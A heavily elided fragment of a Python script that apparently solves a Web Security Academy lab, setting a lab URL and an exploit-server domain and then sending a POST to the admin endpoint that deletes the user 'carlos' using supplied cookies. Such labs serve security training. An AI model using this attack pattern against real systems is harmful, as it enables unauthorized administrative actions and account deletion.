...
url = "https://0a8400db048306d784834f9e00b3001d.web-security-academy.net"

# change this to your exploit domain
exploit_domain = "exploit-0a6600e60445067384bb4e8a0159006a.exploit-server.net"
...
try:    
    ...
    requests.post(f"{url}/admin/delete?username=carlos", data, cookies=cookies)
